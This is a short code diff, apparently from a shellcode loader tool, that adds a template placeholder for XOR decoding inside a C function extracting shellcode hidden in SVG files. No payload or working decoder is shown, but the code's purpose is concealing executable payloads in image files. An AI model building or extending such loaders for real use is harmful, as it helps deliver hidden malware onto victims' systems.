@@ -196,6 +196,8 @@ struct svgdata * GetShellcodeFromSVG()
         shellcode[i] = (unsigned char)holder[i];
     }
 
+    ###XOR_LOGIC###
+
     struct svgdata* d = malloc(sizeof(struct svgdata));
     d->shellcode = malloc(count);
     memcpy(d->shellcode, shellcode, count);
